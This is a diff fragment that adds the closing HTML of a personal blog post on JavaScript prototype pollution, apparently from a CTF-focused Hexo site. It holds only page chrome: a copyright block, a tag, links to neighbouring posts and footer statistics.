+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechat.png" alt="baozongwi reward">
+        <span>reward</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>baozongwi
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://baozongwi.xyz/posts/5d5d07b8.html" title="JavaScript原型链污染">https://baozongwi.xyz/posts/5d5d07b8.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%A7%BF%E5%8A%BF/" rel="tag"># 姿势</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/2ed7bd3.html" rel="prev" title="ctfshow单身杯二">
+                  <i class="fa fa-angle-left"></i> ctfshow单身杯二
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/d66f78b0.html" rel="next" title="hgame2025">
+                  hgame2025 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baozongwi</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">3.1m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">87:21</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
